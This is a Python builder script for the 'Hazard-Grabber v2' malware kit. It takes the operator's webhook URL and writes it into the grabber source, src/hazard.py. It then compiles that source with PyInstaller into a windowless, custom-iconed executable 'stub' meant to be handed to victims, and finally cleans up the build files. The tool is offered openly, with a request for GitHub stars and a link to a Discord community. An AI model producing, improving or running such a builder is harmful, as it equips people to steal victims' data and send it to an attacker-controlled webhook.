import time
import os
import shutil
import subprocess

from win10toast import ToastNotifier

subprocess.Popen('title Hazard-Grabber Builder', shell=True)
subprocess.Popen("color b", shell=True)
subprocess.Popen("cls", shell=True)

webhook = input("What is your webhook? \n")

search_text = "YOUR_WEBHOOK_HERE"
replace_text = webhook

try:
    with open(r'src/hazard.py', 'r') as file:
  
        data = file.read()
  
        data = data.replace(search_text, replace_text)
  
    with open(r'src/hazard.py', 'w') as file:
  
        file.write(data)
    print("Successfully wrote your webhook to the src. Make sure again you entered a correct one!")
    time.sleep(0.5)
    print(f"This is the webhook you entered: {webhook}")
except Exception as e:
    print("Failed to write your webhook to the src. Make sure the code is correct and has not been changed.")
    time.sleep(0.5)
    print(f"This is the webhook you entered: {webhook}")
    print(f"Advanced Log : {e}")
    
name = input("What should be the name of the file that is being created? ")
print("That sounds cool!")
time.sleep(1.5)
        
print("Starting to build your stub in 3 seconds...")
time.sleep(3.0)
print("File compilation started well.")
time.sleep(0.5)
print("Press CTRL + C to cancel, may break the application for future builds.")
time.sleep(1.0)
     
subprocess.Popen(f"pyinstaller --onefile --noconsole -n {name} -i build/exe.ico src/hazard.py", shell=True)
subprocess.Popen("cls", shell=True)
    
subprocess.Popen("color b", shell=True)
    
directory = os.getcwd()
toast = ToastNotifier()
    
toast.show_toast(
    "Hazard-Grabber-v2",
    "Your stub has been built!",
    duration = 25,
    icon_path = directory+"/build/hazard.ico",
    threaded = True,
)

path = directory+"/build/"+name
path2 = directory+f"{name}.spec"

try: 
    shutil.rmtree(f"{directory}/build/{name}")
    os.remove(f"{name}.spec")
    print(f"Successfully cleaned the folder and removed non-required temporary files. ({path}, {path2})")
except Exception as e:
    print(f"Couldn't delete temporary files. They have probably already been deleted.")
    print(f"Advanced Log : {e}")

time.sleep(1)

try:
    with open(r'src/hazard.py', 'r') as file:
  
        data = file.read()
  
        data = data.replace(replace_text, search_text)
  
    with open(r'src/hazard.py', 'w') as file:
  
        file.write(data)
    print("Successfully removed your webhook from the src for future builds.")
    time.sleep(0.5)
except Exception as e:
    print("Failed to remove your webhook from the src. Make sure the code is correct and has not been changed.")
    time.sleep(0.5)
    print(f"Advanced Log : {e}")

try:
    shutil.move(f"{directory}/dist/{name}.exe", f"{directory}")
    print(f"Moved {name}.exe to main directory successfully.")
    shutil.rmtree(f"{directory}/dist")


except Exception as e:
    print(f"Couldn't move {name}.exe to main directory. Maybe is has been deleted or wasn't built correctly. I would still recommend you to check the dist directory for {name}.exe")
    print(f"Advanced Log : {e}")

time.sleep(1)

print(f"Done. Check the current working directory for a {name}.exe!")
time.sleep(0.5)
print("I would appreciate a star on GitHub and some feedback really much!")
time.sleep(0.5)
print("You may also like to contribute in our community. https://discord.gg/gqms5tajzr")
time.sleep(0.5)
print("Closing in 10 seconds...")
time.sleep(10)
exit()
